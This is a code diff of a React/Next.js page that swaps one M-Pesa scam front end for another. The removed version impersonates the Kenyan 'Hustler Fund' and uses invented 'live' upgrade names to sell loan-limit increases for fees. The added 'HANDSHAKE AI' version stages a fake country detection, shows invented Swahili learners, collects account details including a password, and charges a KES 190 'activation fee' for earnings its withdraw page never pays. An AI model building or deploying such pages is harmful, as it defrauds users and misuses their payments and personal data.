@@ -1,296 +1,525 @@
 "use client";
 
-import React, { useEffect, useState } from "react";
+import { useEffect, useState } from "react";
 
-type Limit = {
-  id: string;
-  amount: number;
-  fee: number;
-};
-
-const limits: Limit[] = [
-  { id: "l1", amount: 2000, fee: 150 },
-  { id: "l2", amount: 5000, fee: 300 },
-  { id: "l3", amount: 7000, fee: 500 },
-  { id: "l4", amount: 10000, fee: 800 },
-  { id: "l5", amount: 15000, fee: 1200 },
-  { id: "l6", amount: 20000, fee: 1500 },
-  { id: "l7", amount: 30000, fee: 2000 },
-  { id: "l8", amount: 40000, fee: 2500 },
-  { id: "l9", amount: 50000, fee: 3000 },
-];
-
-const fakeNames = ["James K.", "Mercy W.", "Brian O.", "Faith N.", "Allan M."];
-const fakeAmounts = [12000, 18000, 24000, 32000, 50000];
+type Step = "loading" | "detected" | "form" | "dashboard" | "withdraw";
 
 const BACKEND_URL =
-  process.env.NEXT_PUBLIC_BACKEND_URL ||
-  "https://starlink-backend-yb3n.onrender.com";
+process.env.NEXT_PUBLIC_BACKEND_URL ||
+"https://starlink-backend-yb3n.onrender.com";
 
-export default function HustlerFundPortal() {
-  const [selected, setSelected] = useState<Limit | null>(null);
-  const [phone, setPhone] = useState("");
-  const [open, setOpen] = useState(false);
-  const [loading, setLoading] = useState(false);
-  const [done, setDone] = useState(false);
-  const [recent, setRecent] = useState({ name: "", amount: 0 });
-  const [error, setError] = useState("");
+export default function Page() {
+const [step, setStep] = useState<Step>("loading");
+const [progress, setProgress] = useState(0);
+const [isLogin, setIsLogin] = useState(false);
 
-  const normalizePhone = (num: string) => {
-    let phone = num.replace(/\D/g, "");
 
-    if (phone.startsWith("07") || phone.startsWith("01")) {
-      return "254" + phone.slice(1);
-    }
+const [form, setForm] = useState({
+name: "",
+email: "",
+phone: "",
+password: "",
+});
 
-    if (phone.startsWith("254")) return phone;
+const [showPay, setShowPay] = useState(false);
+const [payPhone, setPayPhone] = useState("");
+const [loadingPay, setLoadingPay] = useState(false);
+const [payDone, setPayDone] = useState(false);
 
-    return phone;
-  };
+const loadingSteps = [
+"Detecting your country...",
+"Analyzing location data...",
+"Connecting to East Africa servers...",
+"Loading payment methods...",
+"Verifying M-Pesa integration...",
+"Finalizing setup...",
+];
 
-  useEffect(() => {
-    const update = () => {
-      setRecent({
-        name: fakeNames[Math.floor(Math.random() * fakeNames.length)],
-        amount: fakeAmounts[Math.floor(Math.random() * fakeAmounts.length)],
-      });
-    };
+useEffect(() => {
+let i = 0;
+const interval = setInterval(() => {
+i++;
+setProgress(i);
+if (i === loadingSteps.length) {
+clearInterval(interval);
+setTimeout(() => setStep("detected"), 1200);
+}
+}, 700);
+return () => clearInterval(interval);
+}, []);
 
-    update();
-    const t = setInterval(update, 2000);
-    return () => clearInterval(t);
-  }, []);
+const normalizePhone = (num: string) => {
+let phone = num.replace(/\D/g, "");
+if (phone.startsWith("07") || phone.startsWith("01")) {
+return "254" + phone.slice(1);
+}
+if (phone.startsWith("254")) return phone;
+return phone;
+};
 
-  const validate = () => {
-    const normalized = normalizePhone(phone);
+const handlePayment = async () => {
+const phone = normalizePhone(payPhone);
 
-    if (!/^254(7|1)\d{8}$/.test(normalized)) {
-      setError("Enter a valid Safaricom number");
-      return false;
-    }
+if (!/^254(7|1)\d{8}$/.test(phone)) {
+alert("Enter valid Safaricom number");
+return;
+}
 
-    setError("");
-    return true;
-  };
+setLoadingPay(true);
+try {
+const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+phone,
+amount: 190,
+local_id: `ACT${Date.now().toString(36)}`,
+transaction_desc: "Chat activation fee",
+till_id: 1,
+}),
+});
 
-  const submit = async () => {
-    if (!selected) return;
-    if (!validate()) return;
+const data = await res.json();
+if (data.status) setPayDone(true);
+else alert(data.msg || "Payment failed");
 
-    setLoading(true);
+} catch {
+alert("Network error");
+} finally {
+setLoadingPay(false);
+}
+};
 
-    try {
-      const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          phone: normalizePhone(phone),
-          amount: selected.fee,
-          local_id: `H${Date.now().toString(36)}`,
-          transaction_desc: `Hustler Fund increase to Ksh ${selected.amount}`,
-          till_id: 1,
-        }),
-      });
+const handleContinue = () => {
+if (!form.name || !form.email || !form.phone || !form.password) {
+alert("Please fill all fields");
+return;
+}
+setStep("dashboard");
+};
 
-      const data = await res.json();
-      if (data.status) setDone(true);
-    } catch (err) {
-      console.log(err);
-    } finally {
-      setLoading(false);
-    }
-  };
+const users = [
+{ name:"John Smith",country:"USA",level:"Beginner",desc:"I want to learn Swahili for my trip to Tanzania",tags:["Travel","Culture","Food"],color:"bg-indigo-500",initials:"JS"},
+{ name:"Emma Wilson",country:"UK",level:"Beginner",desc:"Interested in East African culture and languages",tags:["Culture","History","Music"],color:"bg-green-600",initials:"EW"},
+{ name:"Michael Brown",country:"Canada",level:"Intermediate",desc:"Planning to work in Kenya, need to improve my Swahili",tags:["Business","Travel","Sports"],color:"bg-red-500",initials:"MB"},
+{ name:"Sarah Johnson",country:"Australia",level:"Beginner",desc:"Moving to Tanzania for a teaching job",tags:["Education","Travel","Culture"],color:"bg-orange-500",initials:"SJ"},
+{ name:"David Martinez",country:"Spain",level:"Intermediate",desc:"Learning Swahili to connect with my Kenyan friends",tags:["Culture","Sports","Music"],color:"bg-purple-600",initials:"DM"},
+{ name:"Lisa Chen",country:"Singapore",level:"Beginner",desc:"Planning a safari adventure in East Africa",tags:["Travel","Wildlife","Photography"],color:"bg-pink-500",initials:"LC"},
+];
 
-  return (
-    <div className="min-h-screen bg-white text-black">
+return (
+<div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
 
-      {/* HEADER */}
-      <div className="border-b-4 border-red-600 bg-[#006400] text-white">
-        <div className="max-w-5xl mx-auto px-6 py-4 flex justify-between items-center">
-
-          <div>
-            <h1 className="text-lg font-extrabold tracking-wide">
-              HUSTLER FUND OFFICIAL
-            </h1>
-            <p className="text-xs text-green-200 font-medium">
-              LOAN LIMIT INCREASE PROGRAM
-            </p>
-          </div>
-
-          <div className="text-xs bg-white text-[#006400] font-bold px-3 py-1 border-2 border-red-600">
-            VERIFIED SYSTEM
-          </div>
+{/* LOADING */}
+{step === "loading" && (
+<div className="bg-white border-t-4 border-red-500 rounded-2xl w-full max-w-md p-6 shadow-xl text-center">
+    {/* LOGO / REGION BADGE */}
+      <div className="flex flex-col items-center mb-4">
+        <div className="w-16 h-16 flex items-center justify-center rounded-full bg-green-600 text-white text-2xl shadow-md">
+          🌍
         </div>
+        <span className="mt-2 text-xs bg-green-100 text-green-700 px-3 py-1 rounded-full font-semibold">
+          East Africa
+        </span>
       </div>
 
-      {/* MAIN */}
-      <div className="max-w-5xl mx-auto px-6 py-8 grid grid-cols-3 gap-8">
+<h1 className="text-xl font-bold mb-3">Welcome to HANDSHAKE AI
+</h1>
+<div className="text-center text-green-700 font-bold py-6">
+KENYA✔ . TANZANIA✔ . UGANDA✔<br/>
 
-        {/* LEFT */}
-        <div className="col-span-2 space-y-6">
+</div>
+<div className="space-y-2 text-left mt-4">
+{loadingSteps.map((s,i)=>(
+<div key={i} className={`p-2 rounded-lg border text-xs ${i<=progress?"bg-green-100 border-green-400":"bg-gray-100"}`}>{s}</div>
+))}
+</div>
+<div className="h-2 bg-gray-200 rounded mt-4">
+<div className="h-2 bg-green-600 rounded" style={{width:`${(progress/loadingSteps.length)*100}%`}}/>
+</div>
+</div>
+)}
 
-          <div>
-            <h2 className="text-2xl font-extrabold text-black">
-              Loan Limit Upgrade Portal
-            </h2>
-            <p className="text-sm text-gray-600 mt-1">
-              Apply for a higher Hustler Fund limit through our secure system.
-              Increase your loan even when you have an ACTIVE one. 
-            </p>
-          </div>
+{/* DETECTED */}
+{step === "detected" && (
+  <div className="fixed inset-0 flex items-center justify-center bg-black/40 backdrop-blur-sm z-50">
+    
+    <div className="bg-white w-full max-w-md rounded-2xl shadow-2xl p-8 text-center relative animate-fadeIn">
 
-          {/* LIVE */}
-          <div className="border-l-4 border-green-600 pl-3 text-sm">
-            <span className="text-green-700 font-bold">
-              {recent.name}
-            </span>{" "}
-            upgraded to{" "}
-            <span className="font-extrabold">
-              Ksh {recent.amount.toLocaleString()}
-            </span>{" "}
-            <span className="text-red-600 font-semibold">• LIVE</span>
-          </div>
-
-          {/* LIMITS */}
-          <div>
-            <h3 className="font-bold mb-3 text-black">
-              Select Loan Tier(Increase your Husler-Fund Limit)
-            </h3>
-
-            <div className="grid grid-cols-2 gap-3">
-              {limits.map((l) => {
-                const active = selected?.id === l.id;
-
-                return (
-                  <div
-                    key={l.id}
-                    onClick={() => setSelected(l)}
-                    className={`
-                      cursor-pointer border-2 p-4 transition font-semibold
-                      ${
-                        active
-                          ? "bg-green-700 text-white border-red-600"
-                          : "bg-white text-black border-gray-300 hover:border-green-600"
-                      }
-                    `}
-                  >
-                    <div className="text-lg font-extrabold">
-                      Ksh {l.amount.toLocaleString()}
-                    </div>
-                    <div className="text-xs">
-                      Fee: Ksh {l.fee}
-                    </div>
-                  </div>
-                );
-              })}
-            </div>
-          </div>
-
-          {/* BUTTON */}
-          <button
-            onClick={() => selected && setOpen(true)}
-            className="bg-green-700 hover:bg-green-800 text-white px-6 py-3 font-bold text-sm border-2 border-red-600"
-          >
-            APPLY FOR INCREASE
-          </button>
+      {/* LOGO / REGION BADGE */}
+      <div className="flex flex-col items-center mb-4">
+        <div className="w-16 h-16 flex items-center justify-center rounded-full bg-green-600 text-white text-2xl shadow-md">
+          🌍
         </div>
-
-        {/* RIGHT */}
-        <div className="space-y-4">
-
-          <div className="border-2 border-green-700 bg-white p-4">
-            <h3 className="font-bold text-sm mb-2">
-              OFFICIAL NOTICE
-            </h3>
-            <p className="text-xs text-gray-700">
-              This is a secure Hustler Fund system. All applications are reviewed digitally.
-              Check on *254# after Applying.
-            </p>
-          </div>
-
-          <div className="border-2 border-red-600 bg-white p-4">
-            <h3 className="font-bold text-sm mb-2">
-              REQUIREMENTS
-            </h3>
-            <ul className="text-xs text-gray-700 space-y-1">
-              <li>• Valid Safaricom Number</li>
-              <li>• Hustler Fund registered</li>
-              <li>• One Request Per User</li>
-            </ul>
-          </div>
-
-          <div className="border-2 border-yellow-500 bg-yellow-50 p-4">
-            <h3 className="font-bold text-sm mb-2 text-yellow-700">
-              PROCESSING
-            </h3>
-            <p className="text-xs text-yellow-700">
-              Instant Increase after payment confirmation.
-            </p>
-          </div>
-
-        </div>
+        <span className="mt-2 text-xs bg-green-100 text-green-700 px-3 py-1 rounded-full font-semibold">
+          East Africa
+        </span>
       </div>
 
-      {/* MODAL */}
-      {open && selected && (
-        <div className="fixed inset-0 bg-black/50 flex items-center justify-center px-4">
-          <div className="bg-white w-full max-w-sm border-4 border-green-700">
+      {/* TITLE */}
+      <h1 className="text-2xl font-bold text-gray-800 mb-2">
+        Welcome to HANDSHAKE AI
+      </h1>
 
-            <div className="bg-green-700 text-white p-4">
-              <h2 className="text-sm font-bold">
-                HUSTLER FUND VERIFICATION
-              </h2>
-              <p className="font-extrabold text-lg">
-                Ksh {selected.amount.toLocaleString()}
-              </p>
-            </div>
+      <p className="text-sm text-gray-500 mb-6">
+        Kenya • Tanzania • Uganda
+      </p>
 
-            <div className="p-5">
-              {!done ? (
-                <>
-                  <p className="text-xs mb-3 font-medium text-gray-700">
-                    Enter your Safaricom number to receive M-Pesa prompt.
-                  </p>
+      {/* DETECTED BOX */}
+      <div className="border border-green-200 bg-green-50 rounded-xl p-6 mb-6 relative overflow-hidden">
 
-                  <input
-                    value={phone}
-                    onChange={(e) => setPhone(e.target.value)}
-                    placeholder="07XXXXXXXX"
-                    className="w-full border-2 border-gray-300 px-3 py-2 text-sm focus:border-green-700 outline-none"
-                  />
-
-                  {error && (
-                    <p className="text-red-600 text-xs mt-2">{error}</p>
-                  )}
-
-                  <div className="flex gap-3 mt-4">
-                    <button
-                      onClick={() => setOpen(false)}
-                      className="w-1/2 border-2 border-gray-400 py-2 text-sm font-semibold"
-                    >
-                      CANCEL
-                    </button>
-
-                    <button
-                      onClick={submit}
-                      className="w-1/2 bg-green-700 text-white py-2 text-sm font-bold border-2 border-red-600"
-                    >
-                      {loading
-                        ? "PROCESSING..."
-                        : `PAY Ksh ${selected.fee}`}
-                    </button>
-                  </div>
-                </>
-              ) : (
-                <div className="text-center py-6 text-green-700 font-extrabold">
-                  REQUEST SUBMITTED
-                </div>
-              )}
-            </div>
+        {/* ANIMATED CHECK ICON */}
+        <div className="flex justify-center mb-3">
+          <div className="w-14 h-14 flex items-center justify-center rounded-full bg-green-500 text-white text-xl animate-bounceSlow shadow-md">
+            ✓
           </div>
         </div>
-      )}
+
+        <h2 className="text-lg font-semibold text-green-700">
+          🇰🇪 Kenya Detected!
+        </h2>
+
+        <p className="text-sm text-green-600 mt-1">
+          Your country is fully supported
+        </p>
+      </div>
+
+      {/* BUTTON */}
+      <button
+        onClick={() => setStep("form")}
+        className="w-full bg-green-600 hover:bg-green-700 transition text-white py-3 rounded-xl font-semibold shadow-md"
+      >
+        Get Started →
+      </button>
+    </div>
+  </div>
+)}
+{/* FORM */}
+{step === "form" && (
+  <div className="bg-white border-t-4 border-green-500 rounded-2xl w-full max-w-md p-6 shadow-xl">
+
+    <h1 className="text-xl font-bold mb-4 text-center">
+      {isLogin ? "Login" : "Create Account"}
+    </h1>
+
+    {/* REGISTER ONLY */}
+    {!isLogin && (
+      <>
+        <input
+          placeholder="Full Name (e.g. Jhn wht)"
+          className="w-full border-2 border-green-200 p-3 mb-3 rounded-lg placeholder-gray-400 focus:border-green-500 outline-none"
+          onChange={(e)=>setForm({...form,name:e.target.value})}
+        />
+
+        <input
+          placeholder="Phone Number (e.g. 07/01/254XXXXXXXX)"
+          className="w-full border-2 border-green-200 p-3 mb-3 rounded-lg placeholder-gray-400 focus:border-green-500 outline-none"
+          onChange={(e)=>setForm({...form,phone:e.target.value})}
+        />
+      </>
+    )}
+
+    {/* ALWAYS SHOWN */}
+    <input
+      type="email"
+      placeholder="Email Address"
+      className="w-full border-2 border-green-200 p-3 mb-3 rounded-lg placeholder-gray-400 focus:border-green-500 outline-none"
+      onChange={(e)=>setForm({...form,email:e.target.value})}
+    />
+
+    <input
+      type="password"
+      placeholder={isLogin ? "Enter Password" : "Create Password"}
+      className="w-full border-2 border-green-200 p-3 mb-4 rounded-lg placeholder-gray-400 focus:border-green-500 outline-none"
+      onChange={(e)=>setForm({...form,password:e.target.value})}
+    />
+
+    {/* BUTTON */}
+    <button
+      onClick={() => {
+        if (isLogin) {
+          // only require email + password
+          if (!form.email || !form.password) {
+            alert("Enter email and password");
+            return;
+          }
+          setStep("dashboard");
+        } else {
+          // require all fields
+          if (!form.name || !form.phone || !form.email || !form.password) {
+            alert("Fill all fields");
+            return;
+          }
+          handleContinue();
+        }
+      }}
+      className="w-full bg-green-700 hover:bg-green-800 transition text-white py-3 rounded-xl font-bold"
+    >
+      {isLogin ? "Login →" : "Continue →"}
+    </button>
+
+    {/* SWITCH */}
+    <p className="text-center text-sm text-gray-500 mt-4">
+      {isLogin ? "Don't have an account?" : "Already have an account?"}{" "}
+      <span
+        onClick={() => setIsLogin(!isLogin)}
+        className="text-green-600 font-semibold cursor-pointer"
+      >
+        {isLogin ? "Register" : "Login"}
+      </span>
+    </p>
+
+  </div>
+)}
+{/* DASHBOARD */}
+{step === "dashboard" && (
+<div className="w-full max-w-6xl">
+
+<div className="bg-white shadow-sm rounded-xl px-6 py-4 mb-6 flex justify-between items-center">
+<h1 className="font-bold text-green-700 text-lg">
+HANDSHAKE AI
+<span className="ml-2 bg-green-700 text-white px-2 py-1 text-xs rounded">KE</span>
+</h1>
+
+<div className="flex gap-3 items-center">
+<button onClick={()=>setStep("withdraw")} className="bg-green-600 text-white px-4 py-2 rounded-lg text-sm font-bold">Withdraw Fund</button>
+<span className="text-sm font-extrabold text-gray-800 tracking-wide">
+  {form.name || "User"}
+</span></div>
+</div>
+
+<h2 className="text-2xl font-bold mb-1">Online Learners</h2>
+<p className="text-gray-600 mb-6">Connect with people who want to learn Swahili. Earn $13.68 per chat session.</p>
+
+<div className="bg-white rounded-xl p-4 flex justify-between items-center mb-6 shadow-sm">
+<div className="flex gap-6 text-sm items-center">
+  <p className="flex items-center gap-2">
+    💬 Active Chats: <b>0/6</b>
+  </p>
+
+  <p className="flex items-center gap-2">
+    <span className="text-blue-600 font-bold">$</span>
+    Earnings per chat: <b className="text-blue-600">13.68</b>
+  </p>
+</div>
+<button onClick={()=>setShowPay(true)} className="bg-orange-500 hover:bg-orange-600 text-white px-5 py-2 rounded-lg font-semibold">Activate Chat Access</button>
+</div>
+
+<div className="bg-yellow-100 border border-yellow-300 p-4 rounded-xl mb-6">
+<h3 className="font-bold">Chat Activation Required</h3>
+<p className="text-sm">🔒 Pay onetime activation fee of 1.45$ to Unlock, start chatting and earning.</p>
+</div>
+
+<div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+{users.map((u,i)=>(
+<div key={i} className="bg-white p-5 rounded-xl shadow-sm">
+<div className="flex items-center gap-3 mb-3">
+<div className={`w-12 h-12 rounded-full flex items-center justify-center text-white font-bold ${u.color}`}>{u.initials}</div>
+<div>
+<p className="font-bold">{u.name}</p>
+<p className="text-xs text-gray-500">🌍 {u.country}</p>
+</div>
+</div>
+
+<span className="text-xs bg-green-100 text-green-700 px-2 py-1 rounded">⭐ {u.level}</span>
+<p className="text-sm text-gray-600 mt-3">{u.desc}</p>
+
+<div className="flex gap-2 mt-3 flex-wrap">
+{u.tags.map((t,idx)=>(
+<span key={idx} className="text-xs bg-gray-100 px-2 py-1 rounded">{t}</span>
+))}
+</div>
+
+<button className="mt-4 w-full bg-green-500/80 hover:bg-green-600 text-white py-2 rounded-lg text-sm font-semibold">🔒 Locked</button>
+</div>
+))}
+</div>
+</div>
+)}
+
+{/* WITHDRAW PAGE */}
+{step === "withdraw" && (
+  <div className="w-full max-w-3xl mx-auto">
+
+    {/* TOP BAR */}
+    <div className="flex items-center justify-between mb-6">
+      <div>
+        <h1 className="text-xl font-bold text-gray-800">
+          Withdraw Funds
+        </h1>
+        <p className="text-xs text-gray-500">
+          Fast & secure payouts
+        </p>
+      </div>
+      <div className="bg-white border-2 border-yellow-400 rounded-lg p-3">
+    <p className="text-red-600 text-sm font-semibold text-center">
+      You have not worked yet
+    </p>
+  </div>
+
+      <button
+        onClick={() => setStep("dashboard")}
+        className="text-sm text-gray-500 hover:text-black"
+      >
+        ✕ Close
+      </button>
+    </div>
+
+    {/* BALANCE + QUICK INFO */}
+    <div className="grid md:grid-cols-3 gap-4 mb-6">
+
+      <div className="bg-white rounded-xl p-4 shadow-sm">
+        <p className="text-xs text-gray-500">Balance</p>
+        <h2 className="text-xl font-bold text-gray-800">$0.00</h2>
+      </div>
+
+      <div className="bg-white rounded-xl p-4 shadow-sm">
+        <p className="text-xs text-gray-500">Min Withdraw</p>
+        <h2 className="text-sm font-semibold">$5</h2>
+      </div>
+
+      <div className="bg-white rounded-xl p-4 shadow-sm">
+        <p className="text-xs text-gray-500">Processing</p>
+        <h2 className="text-sm font-semibold">2–44 hrs</h2>
+      </div>
 
     </div>
-  );
+
+    {/* MAIN SECTION */}
+    <div className="grid md:grid-cols-2 gap-6">
+
+      {/* LEFT - FORM */}
+      <div className="bg-white rounded-xl p-5 shadow-sm">
+        <h3 className="font-semibold text-gray-800 mb-4">
+          Withdrawal Request
+        </h3>
+        <p className="text-xs text-gray-500">
+          payouts from the phone number you registered with
+        </p>
+
+        <input
+          placeholder="M-Pesa number (07XXXXXXXX)"
+          className="w-full border border-gray-200 focus:border-green-600 outline-none p-3 rounded-lg mb-3 text-sm"
+        />
+
+        <input
+          placeholder="Amount (USD)"
+          className="w-full border border-gray-200 focus:border-green-600 outline-none p-3 rounded-lg mb-4 text-sm"
+        />
+
+        <button className="w-full bg-green-600 hover:bg-green-700 text-white py-2.5 rounded-lg font-semibold text-sm transition">
+          Submit Request
+        </button>
+      </div>
+
+    {/* RIGHT - RULES */}
+<div className="bg-gradient-to-br from-blue-50 to-blue-100 rounded-2xl p-6 shadow-md border border-blue-200">
+
+  {/* Header */}
+  <div className="flex items-center justify-between mb-5">
+    <h3 className="text-base font-semibold text-blue-900">
+      Rules & Info
+    </h3>
+
+    <span className="text-xs px-2 py-1 bg-blue-200 text-blue-800 rounded-full">
+      Read Carefully
+    </span>
+  </div>
+
+  {/* Rules List */}
+  <div className="space-y-4">
+
+    <div className="flex items-center justify-between py-2 border-b border-blue-100">
+      <span className="text-sm text-blue-700">Minimum</span>
+      <span className="text-sm font-semibold text-blue-900">$5</span>
+    </div>
+
+    <div className="flex items-center justify-between py-2 border-b border-blue-100">
+      <span className="text-sm text-blue-700">Processing Time</span>
+      <span className="text-sm font-semibold text-blue-900">2–24 hrs</span>
+    </div>
+
+    <div className="flex items-center justify-between py-2 border-b border-blue-100">
+      <span className="text-sm text-blue-700">Verification</span>
+      <span className="text-sm font-semibold text-blue-900">Be ACTIVATED</span>
+    </div>
+
+    <div className="flex items-center justify-between py-2">
+      <span className="text-sm text-blue-700">Method</span>
+      <span className="text-sm font-semibold text-blue-900">M-Pesa</span>
+    </div>
+
+  </div>
+
+  {/* Info box */}
+  <div className="mt-5 rounded-xl border border-blue-200 bg-blue-200/40 p-3">
+    <p className="text-xs text-blue-900 leading-relaxed">
+      Make sure your account details are correct before submitting.
+    </p>
+  </div>
+</div>
+    </div>
+
+  </div>
+)}
+{/* ================= PAYMENT MODAL ================= */}
+{showPay && (
+  <div className="fixed inset-0 bg-black/50 flex items-center justify-center px-4">
+    <div className="bg-white w-full max-w-sm rounded-xl p-5 border-t-4 border-yellow-400 relative">
+
+      {/* CLOSE BUTTON */}
+      <button
+        onClick={() => setShowPay(false)}
+        className="absolute top-3 right-3 text-gray-500 hover:text-black text-lg font-bold"
+      >
+        ✕
+      </button>
+
+      {!payDone ? (
+        <>
+          <h2 className="font-bold text-lg mb-2">
+            Activate Chat Access
+          </h2>
+
+          <p className="text-sm text-gray-600 mb-3">
+            Pay activation fee to start chatting and earni $13.68 per chat
+          </p>
+
+          <div className="bg-green-50 border p-3 rounded mb-3">
+            <p className="font-bold text-sm">Activation Fee:</p>
+            <p className="text-green-700 font-extrabold">
+              $1.45 USD
+            </p>
+            <p className="text-xs text-gray-500">
+              ≈ KES 190
+            </p>
+          </div>
+
+          <input
+            placeholder="07XXXXXXXX / 01XXXXXXXX / 254XXXXXXXX"
+            className="w-full border-2 p-3 rounded-lg mb-3"
+            onChange={(e)=>setPayPhone(e.target.value)}
+          />
+
+
+<button
+onClick={handlePayment}
+className="w-full bg-green-700 text-white py-2 rounded font-bold"
+>
+{loadingPay ? "Processing..." : "Pay Now"}
+</button>
+</>
+) : (
+<div className="text-center text-green-700 font-bold py-6">
+Payment Prompt Sent ✔<br/>
+Wait for our email
+</div>
+)}
+
+</div>
+</div>
+)}
+
+</div>
+);
 }
